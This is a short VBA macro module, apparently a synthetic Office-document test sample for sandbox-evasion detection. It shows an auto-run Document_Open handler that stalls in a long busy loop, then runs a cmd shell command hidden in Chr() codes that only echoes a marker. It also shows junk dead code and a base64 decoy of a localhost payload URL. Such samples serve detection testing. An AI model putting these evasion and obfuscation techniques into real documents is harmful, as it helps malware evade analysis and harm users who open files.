
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Long
    Dim bwt1msm67xb As Double
    For frs0swbone = 1 To 300000000
        bwt1msm67xb = bwt1msm67xb + frs0swbone * 0.000001
    Next frs0swbone
    ' only reached if the busy loop is allowed to finish
    Shell Chr(99) & Chr(109) & Chr(100) & Chr(32) & Chr(47) & Chr(99) & Chr(32) & "echo o" & "blivionx" & "-timeout" & "-marker", 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
